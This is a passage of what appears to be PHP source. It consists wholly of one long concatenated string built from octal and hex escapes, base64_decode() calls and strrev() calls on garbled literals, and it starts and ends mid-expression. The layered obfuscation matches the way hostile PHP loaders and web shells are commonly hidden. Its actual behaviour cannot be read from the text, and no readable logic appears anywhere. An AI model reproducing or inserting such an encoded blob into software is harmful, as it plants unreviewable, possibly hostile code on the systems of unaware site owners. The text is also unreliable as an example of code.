4\263\127".base64_decode('FWU7aT9zVoaROnCT0LGc94HhMlcW437BsLllKBFsp1gel9A81TvFgahiOBUHivBDFsDR5YI=')."\x9\xc2\xe1\x4\x2e\xdc\x89\x6d\x71\xa9\x99\x61\x3c\xd8\x1e\xea\x8\xf8\x80\x88\x53\x4c\xa0\xf0\x98\xd1\x53\x9a\x94\x6a\x4c\xf9\x68\x52\xb5\x63\xf8\xc9\x87\xd8\x90\x25\xc8\x57\xd1\xba\x52\x6d\xc4\x9a\xd1\x51\x28".base64_decode('ZKAxMPsK8fegkSJN1dRDD1TJHdhFYwkVDQCQZ4nqVku7haTOj+3oBhk3mUa8lsl8DaV6mZ8=')."\73\124\71\256\63\30\355\154\15\63\213\312\26\220\37\24\230\250\31\200\132\142\141\354\200\5\276\257\260\252\44\73\126\24\21\12\60\50\122\30\112\361\260\160\142\201\63\370\236\217\42\142\313"."\107\21\276\331\140\50\311\41\37\376\176\274\223\207\5\247\215\42\335\161\146\131\203\251\357\322\26\36\156\347\166\347\70\43\32\223\42\201\130\240\43\316\243\261\245\334\122\207\247\121\213\35\265"."\xb3\xbb\x43\x50\xfc\x48\x60\x9\x42\x96\xa8\x60\x50\x18\xb5\xae\xf1\xd5\x2d\xac\xed\xa1\xe6\x90\x34\x48\x7f\x4e\x67\x31\x6c\x22\xb6\x6a\x5d\x83\x47\x99\xb5\xa1\x16\x60\xb8\xe7\x12\xbb\xcf\xc8\x33\x7e\x16\x7f\x65"."\x71\x44\x8d\x44\xdb\x68\x9c\x38\xa\xc\xe5\x53\xe2\x60\xa4\xac\x54\x10\x73\x9d\x10\xcc\xb5\xc5\xb6\x2e\xbe\x1a\x14\x84\xc3\xa\xb5\xa4\x56\x3a\xa3\x4b\x3\xc2\xf7\x9c\x94\x1\x29\xc2\x15\x9d\x7f\xf5\xca\x9e\xa1"."\36\37\142\26\254\65\302\274\261\245\131\141\154\10\361\141\3\147\110\50\35\140\333\350\32\17\354\30\152\326\314\160\16\261\263\205\261\13\364\167\31\13\20\132\11\5\222\304\112\176\230\67\42"."\340\135\241\366\254\357\71\255\307\353\243\66\245\230\171\351\361\210\46\251\241\145\150\217\215\307\35\6\261\152\16\33\331\103\355\250\227\20\242\253\226\106\346\303\17\34\375\346\303\331\3\242\13"."\232\370\144\206\26\257\357\104\177\333\22\353\103\350\157\4\375\104\22\150\272\14\16\200\226\144\44\274\50\264\36\377\43\62\152\371\100\122\203\61\147\201\160\347\172\364\57\42\60\353\303\235\356".base64_decode('yppDiaWhEAVgYfgVoIjgQFclR5LYiAOyhVEHVK2qNWQwvaum1qqq3+oGfOH+V2qqT22ohj0=').strrev('QµáFC ¢8á-+UR‚i™ù‹gp’ÀöñIwv‹Ş!îàDN& \\rˆ@ëê'."\n".'$')."\x3\xc3\x49\xd8\x22\x99\xeb\x75\xa0\x74\xb\xa2\xec\x28\x22\xb1\xec\xf8\x30\x40\x29\xb3\x73\x95\x35\x77\x87\x23\x2d\xb2\xa5\x3f\x6\x84\xd\x85\x50\x75\xd8\x53\xa6\xb0\xc6\xb1\x38\xb1\xf9\x67\x11\x3c\xe4\x2c\x4c"."\xd0\x8d\x45\xc8\x18\xb0\x8\x1d\x0\x16\x23\xc3\xc5\x22\xc4\x3b\x24\x8b\x90\x8e\xb2\x8\x3e\x9d\x84\x3a\x59\x1e\x3a\x87\xa2\x33\x24\x3b\x5c\xf6\x69\x83\xdc\x88\x75\x5e\xaa\x57\x72\xce\x82\x69\xb0\x8f\xca\x10\xb1".base64_decode('9x50QtS45Ngl9iWiMkm4QJUlFcliHsuPJfGWn0Ig5pPAoN+eNQsJc7yG4Sm137YThp11fBQ=')."\xac\x3b\xd1\x47\xc3\xc4\xb8\x56\xfa\x2c\xb3\x82\x21\xe2\x52\xd5\x94\xa4\xfb\x64\xdf\x96\x13\x84\x64\x8c\x5e\x5\x80\x6c\x5b\x88\x95\xb0\xce\x28\x91\x7a\xd3\xa8\xf3\x44\xc5\xc9\xd4\x1a\x7e\x50\x2\x6f\x1d\x1e\xf8"."\205\26\35\105\177\172\40\312\344\44\75\360\221\152\17\154\272\75\214\141\137\331\63\134\137\357\105\377\314\101\177\233\321\337\40\372\33\302\11\255\75\303\263\133\121\140\156\353\52\77\134\342\365"."\364\124\115\64\234\0\300\6\25\242\125\64\312\112\31\174\217\114\366\141\357\100\252\235\143\327\12\344\60\47\104\365\364\372\100\304\133\142\321\56\312\261\50\341\126\205\72\313\120\252\351\205\103".base64_decode('NbBiwVgIryYKxfJqqh3SswXVCtjU1zpLhTtbQsuUaiM1rGqaCoUVtHZZRUpZTawG2la4R7Q=').strrev('…añN÷'."\n".'=|feô„Hø68Vi åyâe«0^ÜG+h Bxa¾vGFE!Ìú').base64_decode('ymqhIpZBK6JZoWWJWAAnEm71iMPRH0KA8GmqmNOoKS/h8XxrQKiwxsFSUmYTM5WAYWSLlPo=').strrev('Q—ùÑ‘Nc'."\0".'ÙÙjÔNs’İXb"İfj%€fq2rØÂÅu:\\Xw,³dˆsÄ')."\x64\xd4\x1a\x1a\xac\xc2\x33\x4f\x83\xe0\xfc\x57\xe5\x16\xe3\x4c\xe8\x52\xc3\x2c\xaf\x3d\x2c\xc0\x3c\x75\x10\xa3\x36\x26\x3d\xcb\x21\x12\xc5\x63\x62\xd6\x0\xf7\x61\x56\xe4\x5c\xd9\x2c\x4f\x78\x27\xc6\x9b\x2a\x9e"."\144\266\73\264\6\272\43\162\12\14\225\262\50\264\374\163\326\10\153\151\245\65\302\362\230\370\106\134\224\361\261\200\236\325\314\204\236\122\247\42\65\323\320\151\266\224\307\136\164\230\354\115\330".base64_decode('tw9isZ1WrJk2kxVibYcduzsRVdGuFAvhPaKsL9IZXp4wKIwBuBvoz+k2g6nUbV6eS7FCnW0=').base64_decode('4c5QE7adR7wCay7I6bBb1DlQTziqRhB/rcqiuHAUhNIOn5tU2Z6GVVU4qvFpQiHfLpYk94U=')."\206\111\224\337\73\170\61\242\255\217\20\47\40\134\127\160\41\72\311\53\365\342\322\362\66\10\345\135\156\156\15\263\21\347\140\140\312\375\314\23\340\252\343\343\156\155\167\71\131\50\342\213\253"."\x75\x76\x93\xcf\xdd\x1f\x42\x81\x6e\xc9\xf5\x4\xb9\x9\x62\x1f\x24\x57\x55\x79\x77\xf3\xb0\x51\x7c\x7\xf3\x6\x84\xf6\xe1\x2c\x73\x97\xa6\xea\xa2\x73\x39\xdd\xb2\xf8\x8d\x7b\xa2\x4f\x57\xac\x82\x9e\x24\x6e\x56".strrev('1¤vI”˜QèÂö%éhZ¸YëŒR6ñ›NU0Í-Äÿd;>îĞXÇ…¦2ùL¤¨ğ').base64_decode('r9Troqsg1BTmAydBicSI8E+M72pEnauYjEEMz6jBtlL3NSxvZN7s4jeqS8X9E+xWqALn/Sw=')."\x2f\x27\x4f\x2\xbe\x16\x2d\x83\xc4\xae\x4a\x3e\x6f\x86\x99\xa3\x2f\xd2\x32\xc9\xe2\x15\x47\x19\xf9\xc8\x39\x2c\xea\x4a\x79\xf4\x11\xaf\x6c\x5e\x86\x30\x8b\x24\x4a\x6\x2d\xcc\x45\x25\x8d\xcd\x6\x85\x19\x9b\x29"."\15\162\335\76\366\133\144\71\76\341\332\210\324\211\271\60\257\160\60\222\322\144\43\140\311\311\377\144\31\161\310\224\13\314\117\33\262\267\21\237\160\361\314\27\323\351\174\242\260\355\274\227\41"."\34\302\56\125\152\113\27\207\27\316\135\351\150\110\323\100\22\150\220\54\177\245\121\64\242\335\300\313\141\104\302\35\51\225\257\62\160\60\35\141\312\104\330\42\107\267\301\377\232\203\222\205\243".base64_decode('UNanY/M2amwU4g45UUHqNu+LC3VLPrYnIDgVywUBkH+wSIRUX/zBmC54B1SMWBN+YSFBgMk=')."\227\110\41\211\150\273\312\20\164\214\111\304\336\327\7\331\2\307\320\256\321\31\125\333\321\306\24\145\254\215\141\45\34\304\237\225\2\22\102\256\253\374\304\254\33\16\232\363\310\175\27\275\230"."\205\311\136\207\350\72\17\61\275\33\160\341\46\130\212\0\375\131\236\113\171\121\303\1\353\122\272\315\235\152\21\73\131\311\345\227\144\24\237\343\364\166\110\362\242\253\15\352\330\170\220\211\161"."\xca\x34\x9b\xa0\x2b\xe5\x9d\x83\x26\xe2\x7b\xb6\x78\xb4\x3b\xc6\xee\x84\x70\x1c\xcb\xc2\xd4\x58\x28\xb8\x9c\x5f\xcf\xf0\xd4\xd6\xc0\x12\x77\x4a\x18\xcb\x32\x3\x6d\x15\x93\xb9\x84\xd\xa7\x93\xa3\xac\x1a\x8b\x62"."\x51\x64\x28\xd2\xea\x2a\x10\x6f\xe7\xe\x99\x9d\x69\x6a\x24\xdc\xb9\xa8\x62\x6\x62\x5d\x3a\xa4\x22\x34\x31\x9c\x8\x75\xb8\xd3\x9c\x35\xc4\x43\x81\x18\xf3\x16\x8e\xe3\xcd\x91\x68\x50\xca\xe\x47\xcb\x47\x82\xf3"."\x46\x3c\x91\xa\x32\x69\xa2\x7f\x75\x4d\xcf\x3a\x72\xb6\x6a\x44\x47\xac\xd4\x7a\x2c\xf1\xf0\xf6\xf8\xd4\x55\x53\x6b\x17\xf6\x6c\xa8\xad\xe9\xf1\x2f\xf4\xd5\x71\x51\x1d\x25\x58\x92\xf9\xf5\x4\xc9\x16\xdb\x7e\x1a".strrev('hÇØfTüm¹ğ]ù†%åÔ4rÂ:œ?ÀeÚâŸÀWá2/Í»æ~=ü„|>üÄ´‰bçx	İ')."\253\226\146\12\20\141\172\341\253\306\227\307\371\154\71\323\34\70\111\261\132\326\3\161\1\243\277\135\62\50\326\205\252\10\350\100\152\207\331\273\234\344\63\114\261\136\304\302\116\231\311\22\166".strrev('†;hò Fq«à,_£=¢6-£LŞÄ^İÙcñaø¬L³f	ø'."\r".'¼…\\Ÿ$£ÉHæ%½')."\375\76\210\130\350\266\366\360\31\213\42\35\235\321\256\305\261\170\242\173\311\322\145\313\301\137\153\43\303\312\264\342\145\342\31\160\200\354\107\207\7\377\40\173\374\141\11\76\35\351\226\137\346"."\46\171\42\32\104\354\271\232\271\333\243\122\25\236\213\11\224\277\162\26\255\315\237\313\333\15\23\100\164\25\365\136\323\264\47\310\135\322\361\371\25\103\346\312\36\153\25\137\6\51\175\220\165"."\x5a\x7\x1d\x5d\xa1\xb6\x68\x89\xc3\x21\x30\x34\x5e\xf9\x35\xa\xbc\x2e\x64\x56\x35\xd5\xeb\xe2\x3c\x20\x21\xcb\x99\x4b\x89\x3f\x11\x89\xdc\x89\x39\x8d\x8e\xe8\x42\x3b\xd4\x1c\x92\x9c\x80\xb3\xe5\x89\x8a\x3\xd7".base64_decode('Bk6J27APXuZzd4C4UHX7Xx3wav2OfOEYfMCLjtOOuMsH62lkt+kwM8Vpfhu3M492KGgL8Cw=')."\362\162\44\273\26\127\231\302\173\143\273\213\30\360\104\356\257\45\116\224\142\33\225\31\360\272\103\53\342\356\123\312\112\312\260\303\145\4\146\366\310\3\5\64\352\121\204\343\164\46\106\166\172".base64_decode('RGfrEa8qyVo6KXvrYPQ91y+09HL9XFUl6eBvMCshYkWJhYEnWFBe8whbmmCD3DwSkx6Xcng=')."\112\221\37\255\321\12\205\140\37\356\203\143\15\73\222\222\162\44\215\25\170\144\325\40\247\133\166\224\335\102\371\310\24\207\267\104\210\373\131\117\113\36\330\313\152\100\74\147\76\304\334\55\224".strrev('zè_W%ì³V^A'."\r".'oÆ\\Œ›•‰¢…¼²Ó^ÃiåÅ“{b™¡Ø¼2–ßŸÙÕ"å')."\73\152\351\340\34\73\64\141\330\113\260\232\175\4\212\342\44\177\121\47\146\376\103\260\77\171\210\343\125\265\236\41\214\37\265\315\217\175\164\22\326\232\353\364\105\343\354\346\312\331\173\372\360".base64_decode('mCQKAOeAbUzPiHs5F06t6YUDDQtn0OiEEMhgvzVmnhlW0EcvZJf4KZ00l7tbkLzJ44dX0FI=')."\147\152\217\222\137\171\304\163\146\370\64\22\67\317\262\353\116\74\344\336\234\343\275\25\72\101\116\157\355\226\256\367\63\65\115\74\333\202\242\24\271\123\175\172\17\355\255\230\340\225\24\57\351"."\x7a\x92\xde\xe1\xc0\x9f\x3\xc9\x43\x1f\x7d\xe1\x3\xda\x4b\x7f\x56\x54\x6a\xbd\xb7\x28\xfc\xdc\xa3\xd9\xa1\xef\x85\x2c\xd2\x47\x98\x3f\xf2\xcf\x77\x69\xde\xd3\xd6\xd3\xd1\x93\x90\xbb\x6b\x17\xb5\x74\x1a\x35\x56"."\162\304\313\47\121\70\266\7\114\42\357\346\260\356\117\354\26\37\56\130\142\264\153\101\174\176\33\306\357\226\10\247\257\335\261\210\343\142\14\100\131\47\106\373\274\101\246\171\146\226\262\51\162"."\46\106\137\64\263\203\272\42\256\310\307\257\376\336\370\175\337\335\367\330\215\343\133\176\260\147\347\303\343\327\357\242\351\164\120\132\364\74\237\332\361\213\56\337\373\360\15\373\356\172\154\377\325"."\167\275\367\310\305\373\266\77\210\125\240\156\372\1\325\210\32\273\344\234\361\357\336\75\166\311\167\366\355\330\70\276\353\322\361\33\316\335\177\355\245\157\237\165\16\54\216\74\361\76\33\50\146"."\112\142\50\150\221\361\357\75\62\366\310\45\373\257\274\166\337\366\355\22\274\215\25\364\262\322\352\100\23\65\166\336\246\375\347\336\61\166\311\145\173\257\274\251\254\0\375\200\173\52\161\367\276"."\173\301\336\255\33\245\34\167\241\146\342\214\137\10\2\170\31\232\61\166\351\346\275\267\337\355\56\104\137\147\250\120\150\374\252\363\367\74\374\200\253\120\247\31\57\45\373\232\45\257\377\343\27".base64_decode('nz9211b+kT07N1N7AVcRrpLH4Wn95fBxhrQtpm6hrbJDs5OwTvduexS1h46YPHNj28/b+70=')."\263\367\156\273\20\146\342\232\355\143\227\336\66\276\355\326\275\67\337\305\253\5\254\162\50\42\343\12\356\71\147\337\3\233\306\257\176\200\3\342\125\235\122\4\14\301\50\12\203\155\43\310\7".base64_decode('9+6+bO/D12Mk+c45e895aOz6u8duOIt/dmznTjHKUT95Xa4CPV2M04GipoU2e6EkPXAo0zA=')."\xcc\x75\xf1\x47\xe9\xb0\xa8\x8b\x3e\xa4\xc1\x98\x29\xf2\xe6\x5\x3c\xcf\xd4\xc4\xd6\x25\x1a\xc7\x7c\xb3\x99\x82\xb1\x5f\x57\x85\xa8\x63\x55\x63\xd5\xa9\x35\xe8\xb7\xb6\xca\x53\x85\xf\x31\x24\x8e\xe9\x23\x4e\x20"."\355\250\152\74\265\206\4\152\301\73\326\50\154\15\222\7\155\261\360\100\74\274\20\21\10\351\102\165\41\331\151\360\76\66\315\77\315\317\366\266\205\3\370\213\342\121\265\156\276\245\10\226\217"."\156\56\364\371\33\166\353\332\251\333\103\146\121\126\351\236\126\17\346\164\175\322\326\220\263\200\310\323\147\51\204\364\14\120\217\352\70\136\272\271\34\351\240\100\57\125\232\166\200\77\170\357\330".base64_decode('pvv2X73NDUvFMwCLObCyFzmpQc3YZdeUf4/AO7/GgMfOvn7vlS5IptirSHI4UYBgv4uOcNI=')."\x2f\x17\xa1\xf8\xfe\xbf\x59\x45\x54\x2a\xda\x88\x6f\xf\x68\xc2\x32\x6f\x77\x61\xa4\x94\xf7\x62\x39\x99\x37\x2e\xfb\x55\x75\x3d\x2c\x55\xef\x84\xc7\x92\x2e\x27\xbc\xcc\x12\x24\xc5\xd6\x9a\x13\x41\xfa\xe0\x55\xa3"."\x22\x3f\x47\x27\x39\x8a\x27\x52\x54\xba\x77\x31\x55\x2b\x48\xc3\xdc\x2\x4b\x12\x9c\x43\x5a\x98\xf\x61\x6\x40\x75\x32\x0\xa7\xbb\xda\x8b\x55\x65\xbc\x88\x8b\xc7\x6b\xc\x2d\x5c\xdb\x90\x5e\x7a\x90\x41\x9c\xef"."\x9b\xb9\x5f\x3d\x73\x8f\x2\x29\x82\xc5\xae\x5e\xf9\xc5\xb5\x61\x74\x8\xc3\xd9\xf8\x75\x1c\x2f\x16\xe2\x7a\x8d\xd4\x44\x39\x82\x70\x54\x6c\x6a\x12\xde\xd3\xa8\x4\xd2\x5d\x32\x52\xee\x4f\x12\x95\x20\x6f\xa9\xc4"."\x3e\x58\xb1\x52\xf9\x88\xc8\x0\x48\x27\xc2\xbc\x3e\xc7\xc3\x30\x1a\x9a\x6b\x7e\xa3\xe9\x7e\x77\x46\x9c\xaf\xb5\xf2\x67\x51\x96\xe7\x52\xca\xb4\xe9\x8d\x33\xe7\xa2\xff\x69\xca\x69\x4c\xa3\xa9\x54\x60\x96\x10\x28"."\xc8\x9e\x4d\x99\xec\x4f\x33\x5a\x23\xde\x2b\x63\x7d\xc3\x13\x2e\x3d\xe6\xe3\x48\x16\xc3\xc8\x1f\x49\x61\x44\xca\x1\x27\x5a\xeb\x78\x6d\xf\x1a\xa2\x89\x33\x56\x29\x2f\xce\xbf\xe0\x60\x5d\x7a\x95\x88\x5c\x34\x51"."\322\205\365\377\124\376\172\123\5\52\116\360\224\67\317\140\357\164\111\365\363\331\312\260\100\221\237\365\65\261\176\172\263\375\242\36\102\174\0\375\373\121\57\114\161\142\42\274\252\104\66\222\175"."\xa5\x7c\x7f\x93\x94\xa9\xd8\xa6\xa9\xe4\xb4\xfc\x8\x1c\x44\xa7\x58\x8d\x53\xac\x79\xf8\x43\x4d\xd8\x16\xc6\x9a\xc2\x1e\xf2\xc2\xdb\x97\x70\x28\x4b\x9d\x96\x41\xe\xbd\x51\xf3\xe1\x57\xf9\x7c\x78\x6f\x8c\x95\x0"."\252\213\120\176\330\13\351\43\150\220\21\351\156\13\167\112\32\212\122\202\32\154\351\124\3\135\135\25\63\140\22\250\140\33\253\367\370\326\112\117\262\322\320\174\164\6\123\222\330\332\252\251\12".base64_decode('p1YpVjHJvK5X+UHhjQAIXmm+AUWqcREljTDHS0I0u3rBfL8BJX3+UzAl92NVv/xpeOpkzSM=').base64_decode('ktoq/L4pynxNocPVVE2uaaqVPrTbcz3nBe7C/Bm9+X5NzsRrKmYypOSH80HuIbXiDV1AepQ=').base64_decode('gbxjFdTyS8qL4Mp9STmLvXfaR4QKrrvg+YUF8/HFElMm9JPIfH9hgTzbxCSu/GN+IlPyiwU=').base64_decode('ptKXaStfh/JbwAp4hBV/EPIzjQst2Y8RUWwk0AzI6MIiCZrheKLGlnS1StiEldwpFcULf+s=')."\326\321\212\360\363\113\33\66\224\247\201\366\267\73\53\120\60\334\111\30\341\334\151\130\64\44\322\320\216\350\374\14\105\166\31\110\244\60\30\372\53\312\104\72\333\104\204\36\352\35\231\53\231"."\336\26\211\365\254\254\366\325\155\330\340\67\230\216\44\323\317\142\145\175\34\232\306\173\174\116\170\324\23\30\172\16\10\11\156\110\212\124\147\0\26\35\341\257\23\366\260\134\27\122\301\12\222"."\115\115\13\126\162\46\154\25\313\123\211\104\105\236\73\306\304\32\15\163\30\122\240\123\146\142\51\17\6\73\5\233\116\54\307\20\123\356\262\34\223\237\133\347\53\215\322\56\37\21\377\5\234"."\x9e\xe2\x17\x8a\x77\x12\x65\x8b\x30\x1a\xe\x14\xa\xe\x22\xc5\x22\xf8\xe\x2e\x6b\xf4\xfa\x39\x65\xa1\xf7\x72\xbe\xa4\xb0\x28\x65\x20\x84\xae\xb9\xd2\xb1\xf6\xa3\x2b\x3\x1b\xb8\x91\xe4\x41\x44\x78\xcd\x22\xa7"."\x84\x3c\x1d\xd5\xc5\x13\x61\x25\x60\x6a\x25\x11\x27\x9e\x3d\xdf\x4a\x16\x8d\x82\xed\xa0\x94\xf4\x5\xf0\x2a\xf2\xa4\xde\x5a\x6d\x50\xa3\x20\x55\xa\x88\xf6\x9a\xaa\xc8\x33\x29\x55\x68\xd5\xd3\x1c\x46\x1e\x79\x3"."\xe7\xe3\xaf\x21\xe6\x3a\xdb\x54\x45\x3a\x61\xf5\xe9\x3a\x2a\x4f\xa8\x5f\xa5\x8f\xa0\x82\x55\xa\xa3\xcf\x39\x8d\x8f\x63\xd1\x36\xd1\xae\xcb\xd\x14\xe1\x41\xd3\xee\x18\x58\x5b\x5\x3a\xe1\x36\xf4\x94\xd5\xf4\xf7".base64_decode('1FP4vOLXVrOI6ya2JIQSEtY+jUW2FAgeVu2KRRPRIHuN0CnbpWkz2DHFora54mTHTAG5ChU=')."\203\340\374\211\37\122\0\33\212\245\174\236\153\257\142\224\346\73\146\123\345\77\53\311\205\255\236\132\65\101\276\262\122\143\327\271\40\200\246\367\323\314\262\26\332\211\366\346\4\166\210\140\101"."\262\344\150\26\273\271\325\123\276\225\324\343\103\123\75\263\7\143\272\262\302\50\225\101\312\71\12\336\154\126\311\253\311\17\24\126\54\276\152\174\3\11\17\205\125\173\252\153\174\165\265\325\345"."\71\124\53\331\231\217\125\376\324\63\342\50\23\236\345\2\246\201\30\134\6\43\341\120\147\102\15\3\277\320\60\155\266\257\136\30\103\32\226\160\334\114\303\101\256\103\125\324\311\250\372\34\335"."\xaa\x30\x34\xf4\x7e\x26\xc1\x75\x6a\xf5\xbc\x43\x5c\x4b\x87\x34\x6b\x32\x97\xc2\xd3\xea\xeb\xeb\xbd\xf5\xd\xe8\x7f\x66\x24\xc2\x1c\x99\x36\xd6\xd7\x97\x81\xd4\xd7\x37\x92\xff\x69\x6\xb9\x23\x1\x14\x74\xe6\x20"."\xaa\xc9\xc8\x3d\x0\xc\xe9\x3a\x34\x8\xb6\x57\x74\xd6\x2e\x31\x8e\x76\x65\x10\xdb\xcb\x2a\xb8\x69\x30\x2d\x42\x27\x18\x61\x1f\xf1\xf4\xcb\x28\xaf\xe3\xad\x57\x85\xa8\x23\x40\x4c\x17\x83\x90\x93\xde\x27\x8d\x83"."\147\350\214\3\333\331\125\2\365\2\317\166\126\324\250\14\31\40\150\73\67\326\106\140\142\5\315\243\46\364\115\274\201\241\174\152\245\374\61\37\33\150\232\50\36\110\360\262\14\257\374\116\21"."\x14\xa2\x44\x4f\xdc\x35\x3a\x9a\x86\xca\x38\xdd\x9\xe3\x14\xc4\x37\x25\x79\x9f\x71\x82\x24\xd6\xc5\x4c\xb1\xe4\x22\x19\x47\xe5\x2b\x45\x92\xcd\x2d\x9e\x49\x2c\xcb\x7d\xcd\xe0\x68\x27\xaf\x89\x3e\x87\x45\xad\x8e"."\x61\xc\x2b\xac\xc8\x3e\x73\x48\x15\xac\xc\x8e\x9e\xc1\x63\x64\x48\xf1\xd9\x95\xa1\x64\x4a\xb2\x4a\xc7\xe3\xca\xf6\x27\x9\x9c\x6b\xde\x9\xc5\x24\xe0\xf1\x88\x97\x94\x7e\x23\xeb\x70\xe2\xa0\x4a\x45\xe5\xb1\x9d".base64_decode('hwFZTxLOkvhdbtxQL253oxhFRN8C/KEwqrTN2qsAxaFR8kYCfZCaSIgajyibcNs92WTeHDc=')."\43\156\25\110\26\223\146\217\135\226\305\277\100\113\221\245\204\130\2\275\346\13\162\377\302\122\5\356\54\127\231\0\275\143\53\53\0\351\345\320\344\52\262\2\64\116\167\101\23\117\302\101\356"."\60\135\166\57\114\205\133\222\276\233\5\257\306\10\145\43\126\307\240\164\244\365\25\212\146\6\141\202\45\17\32\112\357\252\234\314\301\313\41\53\0\361\326\313\160\162\42\276\364\144\57\335\3"."\x6a\x9\xc7\xf\x5a\x8a\x6f\x9e\x12\xa8\x70\x18\x20\x25\x3a\x57\xb8\x94\x11\xe4\xef\xf9\xc9\x89\xf8\x74\x2c\xab\x97\x91\x83\x89\xb3\xe\x7c\xec\x76\xa6\xf0\x96\x7d\xe\xd2\x31\x59\x8a\x5d\xd4\xf2\x56\x5a\xd6\x96".strrev('áÜw2öp¨²Gh	êËñ\'$Üpí*4Ó¦qĞ'."\r".'›L«†@êªÂü—9aJ‚`a')."\320\264\221\361\52\162\61\147\336\133\347\135\306\2\127\60\50\74\254\374\125\133\371\316\16\17\251\52\13\242\360\212\156\267\155\350\123\5\104\164\42\133\31\126\221\175\35\127\320\310\311\222\24".base64_decode('w7Wz61J0LgcHOx6crNAX45W8zt1tOCdVLgCv6pmIu8TOyuVCuK5uF4laxKkkjvG2UtaOaeI=')."\x2a\x53\x7c\xd3\x40\x4b\x78\xa\x7b\x4f\x87\xd2\x68\xa1\xa8\xe1\x77\xdc\x1c\xf8\x10\x4a\x61\x5e\x8b\x6d\xfc\xa8\xaf\xab\xd0\x11\x4a\x6c\x3b\x30\x4b\x2b\x29\xd9\x66\x1f\xc2\xfd\x80\x50\x8a\x4d\x9a\xe2\xdc\x86\xa5"."\x4d\x45\x91\x2b\x42\xdb\x73\xa2\xf\xcb\x8e\x56\x29\xa4\xed\xf3\xc8\x1b\x2c\x15\x72\xb1\xbf\x13\xf6\x35\xee\xcd\x1d\xb6\x3\x4\x63\xda\xfc\xd8\x8d\xab\xf\xa4\xa4\x7d\x36\x22\x33\xc5\x38\xa1\x45\xe7\x2f\x8b\x24".base64_decode('aA3eBaLl8zTeaFlnQXpighdC7eOuWkaNAnnAQxIMuKJuXWFcQuKKUFTasQm/YLMtnz3fIXQ=')."\x6c\x49\x50\x10\xe9\xb7\xae\x39\x8f\x5\x36\x9\x5c\x8b\x4b\xaa\x99\x15\xda\x7\xb5\xf2\x3a\x71\xb\xf2\x42\xc5\x17\x18\x9f\xa2\x9e\x34\x8b\x29\xbc\x69\x4a\xe\x87\xf2\x76\x4c\xcf\xc8\x51\xa2\x14\xc1\x56\x8c\x70"."\xfd\x2f\x57\x81\xfd\xd3\x49\xa4\x9\xaf\xd4\x40\xd2\x2e\xc9\xde\xee\xa4\xd7\x41\x50\x4c\x52\x5\x93\x98\x59\x6f\x83\xc2\xb9\x60\x95\xd6\x4c\x23\x53\xa5\xc\x2\x5f\x89\x21\x76\x89\x8d\x25\x3\x3f\x22\x2f\x8b\x97".base64_decode('evkdt4s1ZTaDisz5MSNAXAHx94V7YMl5qFrslV/0TC5CvllWhOZh5ktYC8o5Fn4HppvNYqU=')."\234\12\237\42\131\322\210\46\71\67\16\243\43\6\11\62\106\164\246\234\356\155\230\346\235\16\247\40\331\202\220\35\360\140\257\101\353\114\102\3\174\104\146\244\16\124\273\1\116\300\230\222\266".base64_decode('AHGLJbz8EF9gfD6J0zAe07mqN/GTJZN7ofxENcAxQHelfDoqOLvFobPvAkBrwpkPj7sIhoc=')."\xba\xea\x32\x1d\x1a\x94\xae\x4a\xe0\x11\x22\xf9\xf9\x1a\x52\x4a\xf4\x43\x18\x36\xa0\x24\x93\x3e\x21\x23\xd\x86\x50\xe2\xa2\x1e\xc4\x98\xe5\x6\xa7\x73\x22\x39\x61\xf2\xc4\x72\x45\x30\x8c\x89\x50\x25\x75\xaf\x0"."\x27\xe5\x9a\x5a\xec\x5e\xc1\x21\xc8\xec\x18\xe1\x46\xf0\x58\xc9\x12\x6f\xde\x5c\x53\xdf\x92\x23\x2c\x97\x23\xa4\xe5\x88\x50\xad\x55\x47\x69\x9e\xc4\xa1\x86\x74\xe6\x29\x81\x9d\xf0\xbb\xda\xbb\xfc\x3c\xa9\x99\x2f".strrev(':k‚!Jè”÷‰jª–J®j#B…|¯ƒ%"øá-"Ú$J’3”80áÖSsLƒ`*I').base64_decode('pXv5s0Q46O1FRwpvih/FLHHoIp2CysSzkM5qKSLqxbIa89iyMVtWBovjK0BnhTRZAi4U9XI=')."\370\21\35\353\122\112\55\226\12\224\52\264\6\340\53\177\201\274\51\45\103\43\116\111\317\117\324\170\43\77\150\130\206\130\365\254\304\210\134\173\240\245\43\334\251\6\42\221\350\122\207\262\263"."\270\210\50\162\231\113\112\176\22\114\232\31\61\11\364\353\262\213\116\71\305\361\146\212\113\16\103\247\117\366\37\133\140\167\146\360\230\61\177\347\207\106\245\47\373\12\105\315\260\164\51\201\276"."\x2e\xd7\x0\xc6\x82\x5a\x36\xeb\x78\x98\x37\x9b\x96\xa2\x25\xe7\xb6\x5a\xf1\x53\x2a\xfd\x0\x4b\x23\x3c\xef\xc4\x0\xb1\x70\x5b\x7b\xe2\x7f\xdc\x54\x23\x25\xbc\x2a\x1a\x29\xa6\xc5\xc6\xd\xc3\xe9\x13\x40\x41\xf9".strrev('˜†Şı€ÔşÂ·È)R³\'ÄÕş¥Tp´ÓŞÀPNIªæö9c‰Tw¸CÉôÿÊyTĞñMög9')."\275\23\216\210\43\14\206\202\112\360\127\350\301\26\235\327\261\354\221\35\166\230\34\17\121\16\30\160\207\346\246\353\315\106\267\316\277\343\105\306\262\157\220\127\176\150\336\112\334\13\4\271\112".strrev('ò©,ØJi eÛúvÁ\\¡ˆ_ÜÏ™I±(ºúz”šP‰­”'."\0".'Ğ©Îê(¼†¸Å	ô')."\76\210\245\105\105\56\372\243\50\300\242\170\236\41\114\110\257\70\12\142\245\116\63\67\122\226\340\20\236\105\130\157\270\172\65\176\345\52\237\66\345\121\47\346\1\330\10\214\76\32\114\145\22"."\36\164\12\321\355\362\147\6\151\361\377\233\202\64\63\56\71\61\166\126\122\336\40\313\275\145\362\355\316\141\311\100\236\123\354\63\207\234\317\12\343\24\211\133\143\326\23\122\171\151\275\21\327"."\xe\xf2\x6b\x8f\xe\x3\xa\xc7\x4b\x5e\x34\x43\x21\x8f\xc3\x2b\x88\x34\x1\x26\x60\x2d\x22\x76\x2\x26\xc0\xd2\xb7\xa7\xd0\x9f\x1e\xf8\x35\x27\x68\x4\xa5\x7a\xf0\xc9\x5a\x8e\x98\xc1\x3e\x23\x9b\x2a\x72\xfd\x30"."\x91\xd0\xa1\xb\xb1\x4\x29\x85\xc8\x4c\x41\xcb\x4b\x8f\x4c\x3a\xdf\xcf\x44\xfd\xa8\xf4\xac\x26\xf6\x3\xeb\x7c\xb5\x4d\x3c\x86\x27\x36\x62\xe7\xe3\x60\x5c\xdd\xc0\x12\xb\xca\xb2\x1d\xcf\xd1\x25\xcc\x84\x96\xf1"."\x50\xfc\xc6\x24\x52\xc4\x9a\x47\xe4\xb0\x6c\x0\x40\